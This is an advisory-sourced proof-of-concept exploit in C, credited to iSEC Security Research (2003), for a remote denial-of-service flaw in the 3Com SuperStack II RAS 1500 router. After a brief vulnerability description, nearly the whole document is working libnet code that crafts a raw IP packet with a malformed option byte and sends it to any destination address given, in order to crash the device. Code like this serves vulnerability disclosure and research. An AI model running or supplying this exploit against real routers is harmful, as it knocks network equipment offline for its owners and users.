// source: https://www.securityfocus.com/bid/7175/info

 vulnerability has been reported in the 3Com SuperStack II RAS 1500 router. The problem occurs when processing network packets containing malicious IP headers. When received, the packet may cause the router to crash.

/*
 * 3com superstack II RAS 1500 remote Denial of Service
 *
 * Piotr Chytla <pch@isec.pl>
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
 * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
 *
 * (c) 2003 Copyright by iSEC Security Research
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <libnet.h>
#define OPT_LEN 4
void usage()
{
  printf("Args: \n");
  printf("-s [source address]\n");
  printf("-d [destination address]\n");
}

int main(int argc,char *argv[])
{
 char a;
 int sock,r;
 u_long src;
 u_long dst;
 char pktbuf[IP_MAXPACKET];
 char payload[]="ABCDEFGHIJKLMNOPRST";
 u_char options[4];
 struct ipoption ipopt;
 bzero(options,OPT_LEN);
 while((a=getopt(argc,argv,"d:s:h?"))!=EOF)
 {
     switch(a) {
         case 'h' : { usage(); exit(1); }
         case 's' : { src=libnet_name_resolve(optarg,0); break;}
         case 'd' : { dst=libnet_name_resolve(optarg,0); break;}
        }
 }
 sock = libnet_open_raw_sock(IPPROTO_RAW);
 if (sock<0)
 {
 perror("socket");
 exit(1);
 }

 libnet_build_ip(strlen(payload),0,0x1337,0,255,0xaa,src,dst,payload,strlen(payload),pktbuf);
  memcpy(ipopt.ipopt_list, options, OPT_LEN);
  *(ipopt.ipopt_list)     = 0xe4;
  *(ipopt.ipopt_list+1)   = 0;
  *(ipopt.ipopt_list+1)   = 0;
  *(ipopt.ipopt_list+1)   = 0;
  r=libnet_insert_ipo(&ipopt,OPT_LEN,pktbuf);
  if (r <0)
   {
        libnet_close_raw_sock(sock);
        printf("Error ip options insertion failed\n");
        exit(1);
   }
  r=libnet_write_ip(sock,pktbuf,LIBNET_IP_H+OPT_LEN+strlen(payload));
  if (r<0)
  {
   libnet_close_raw_sock(sock);
   printf("Error write_ip \n");
   exit(1);
  }
 libnet_close_raw_sock(sock);
 return 0;
}